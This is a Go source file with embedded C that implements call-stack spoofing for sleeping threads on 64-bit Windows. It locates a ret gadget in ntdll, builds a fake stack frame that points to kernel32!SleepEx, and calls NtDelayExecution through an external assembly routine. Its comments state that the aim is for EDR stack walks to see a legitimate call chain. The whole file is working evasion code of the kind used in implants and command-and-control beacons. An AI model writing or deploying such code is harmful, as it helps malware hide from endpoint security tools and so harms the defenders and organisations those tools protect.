//go:build windows && amd64 && cgo

package sleep

/*
#cgo LDFLAGS: -lkernel32

#include <windows.h>

typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);

// spoof_stack_sleep_asm is implemented in spoof_stack_asm.S
// int spoof_stack_sleep_asm(void* frame, void* ntDelayFn);
extern int spoof_stack_sleep_asm(void* frame, void* ntDelayFn);

// spoof_stack_setup_and_sleep prepares the fake stack frame and calls the asm.
int spoof_stack_setup_and_sleep(void* gadget, void* sleepex_ret, unsigned long ms) {
    // 1. Resolve NtDelayExecution from ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        return -1;
    }

    NtDelayExecution_t pNtDelay = (NtDelayExecution_t)GetProcAddress(hNtdll, "NtDelayExecution");
    if (!pNtDelay) {
        pNtDelay = (NtDelayExecution_t)GetProcAddress(hNtdll, "ZwDelayExecution");
    }
    if (!pNtDelay) {
        return -1;
    }

    // 2. Allocate fake stack frame on heap (must be 16-byte aligned for x64 ABI)
    // Frame layout (80 bytes):
    //   [0]  gadget       — ntdll ret gadget (EDR sees this as RSP during sleep)
    //   [1]  real_rsp     — saved real RSP (restored after NtDelayExecution returns)
    //   [2]  sleepex_ret  — kernel32!SleepEx address (fake return address in stack trace)
    //   [3-6] shadow      — x64 shadow space (32 bytes, for NtDelayExecution call)
    //   [7]  alertable    — BOOLEAN FALSE (first param)
    //   [8]  li_ptr       — pointer to LARGE_INTEGER (second param)
    //   [9]  li           — LARGE_INTEGER negative 100-ns interval
    //
    // Note: The assembly code uses offset +0x58 from frame base as RSP,
    // which ensures 16-byte alignment after call pushes return address.

    void* raw = NULL;
    raw = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 96);  // 12 * 8 = 96 bytes, aligned
    if (!raw) {
        return -1;
    }

    // Ensure 16-byte alignment
    uintptr_t base = (uintptr_t)raw;
    if (base % 16 != 0) {
        base = (base + 15) & ~15ULL;
    }

    unsigned long long* frame = (unsigned long long*)base;

    // 3. Fill frame
    frame[0] = (unsigned long long)gadget;       // ret gadget
    frame[1] = 0;                                 // real_rsp (filled by asm)
    frame[2] = (unsigned long long)sleepex_ret;   // SleepEx return addr

    // Shadow space slots (3-6) are zeroed by HEAP_ZERO_MEMORY
    // Slot 7: alertable = FALSE
    frame[7] = 0;
    // Slot 8: pointer to LARGE_INTEGER
    frame[8] = (unsigned long long)&frame[9];
    // Slot 9: LARGE_INTEGER = -ms * 10000 (relative time in 100-ns units)
    frame[9] = (unsigned long long)(-((long long)ms * 10000LL));

    // 4. Execute via assembly
    int result = spoof_stack_sleep_asm(frame, pNtDelay);

    // 5. Cleanup
    HeapFree(GetProcessHeap(), 0, raw);

    return result;
}
*/
import "C"

import (
	"syscall"
	"unsafe"
)

// SpoofStackSleep 使用调用栈伪造执行睡眠。
// 睡眠期间，EDR 的栈回溯看到的是 kernel32!SleepEx 的合法调用链。
func SpoofStackSleep(durationMs uint32) error {
	// 1. 查找 ntdll.dll 的 ret gadget
	gadgetAddr := findRetGadgetInNtdll()
	if gadgetAddr == 0 {
		return ErrGadgetNotFound
	}

	// 2. 获取 SleepEx 地址作为伪造的返回地址
	modKernel32 := syscallLoadLibrary("kernel32.dll")
	if modKernel32 == 0 {
		return ErrKernel32NotFound
	}
	sleepExAddr := syscallGetProcAddress(modKernel32, "SleepEx")
	if sleepExAddr == 0 {
		return ErrSleepExNotFound
	}

	// 3. 调用 C/asm 设置假栈并睡眠
	ret := C.spoof_stack_setup_and_sleep(
		unsafe.Pointer(gadgetAddr),
		unsafe.Pointer(sleepExAddr),
		C.ulong(durationMs),
	)
	if ret != 0 {
		return ErrSpoofStackFailed
	}
	return nil
}

// --- 错误定义 ---

var (
	ErrGadgetNotFound   = spoofErr("ret gadget not found in ntdll.dll")
	ErrKernel32NotFound = spoofErr("kernel32.dll not found")
	ErrSleepExNotFound  = spoofErr("SleepEx not found in kernel32.dll")
	ErrSpoofStackFailed = spoofErr("spoof_stack_setup_and_sleep failed")
)

type spoofErr string

func (e spoofErr) Error() string { return string(e) }

// findRetGadgetInNtdll 扫描 ntdll.dll .text 段寻找 ret (0xC3) 指令。
func findRetGadgetInNtdll() uintptr {
	hMod := syscallLoadLibrary("ntdll.dll")
	if hMod == 0 {
		return 0
	}

	base := hMod

	// DOS header: e_lfanew at offset 0x3C
	eLfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))

	// PE signature check
	if *(*uint32)(unsafe.Pointer(base + uintptr(eLfanew))) != 0x00004550 {
		return 0
	}

	numSections := *(*uint16)(unsafe.Pointer(base + uintptr(eLfanew) + 6))
	sizeOfOptHeader := *(*uint16)(unsafe.Pointer(base + uintptr(eLfanew) + 20))
	optHeader := base + uintptr(eLfanew) + 24

	type SectionHeader struct {
		Name                 [8]byte
		MiscVirtualSize      uint32
		VirtualAddress       uint32
		SizeOfRawData        uint32
		PointerToRelocations uint32
		PointerToLinenumbers uint32
		NumberOfRelocations  uint16
		NumberOfLinenumbers  uint16
		Characteristics      uint32
	}

	sectionsPtr := optHeader + uintptr(sizeOfOptHeader)

	var textStart, textSize uintptr
	for i := uint16(0); i < numSections; i++ {
		sec := (*SectionHeader)(unsafe.Pointer(sectionsPtr + uintptr(i)*unsafe.Sizeof(SectionHeader{})))
		if sec.Name[0] == '.' && sec.Name[1] == 't' && sec.Name[2] == 'e' && sec.Name[3] == 'x' && sec.Name[4] == 't' {
			textStart = base + uintptr(sec.VirtualAddress)
			textSize = uintptr(sec.MiscVirtualSize)
			if textSize == 0 {
				textSize = uintptr(sec.SizeOfRawData)
			}
			break
		}
	}

	if textStart == 0 || textSize == 0 {
		return 0
	}

	// Scan for ret (0xC3), avoiding REX prefix false positives
	for i := uintptr(16); i < textSize-1; i++ {
		addr := textStart + i
		b := *(*byte)(unsafe.Pointer(addr))
		if b == 0xC3 {
			prev := *(*byte)(unsafe.Pointer(addr - 1))
			if prev < 0x40 || prev > 0x4F {
				return addr
			}
		}
	}
	return 0
}

var (
	kernel32           = syscall.NewLazyDLL("kernel32.dll")
	procLoadLibrary    = kernel32.NewProc("LoadLibraryA")
	procGetProcAddress = kernel32.NewProc("GetProcAddress")
)

func syscallLoadLibrary(name string) uintptr {
	nameBytes := append([]byte(name), 0)
	ret, _, _ := procLoadLibrary.Call(uintptr(unsafe.Pointer(&nameBytes[0])))
	return ret
}

func syscallGetProcAddress(module uintptr, name string) uintptr {
	nameBytes := append([]byte(name), 0)
	ret, _, _ := procGetProcAddress.Call(module, uintptr(unsafe.Pointer(&nameBytes[0])))
	return ret
}
